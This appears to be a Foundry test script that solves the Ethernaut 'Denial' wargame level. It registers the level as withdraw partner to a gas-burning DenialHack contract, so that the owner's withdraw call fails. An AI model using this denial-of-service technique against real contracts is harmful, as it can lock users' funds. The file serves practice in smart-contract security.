pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../Denial/DenialHack.sol";
import "../Denial/DenialFactory.sol";
import "../Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(0);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testDenialHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create DenialHack Contract
        DenialHack denialHack = new DenialHack();

        // set withdraw parter. callback function will waste all pased gas when admin calls "withdraw"
        ethernautDenial.setWithdrawPartner(address(denialHack));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
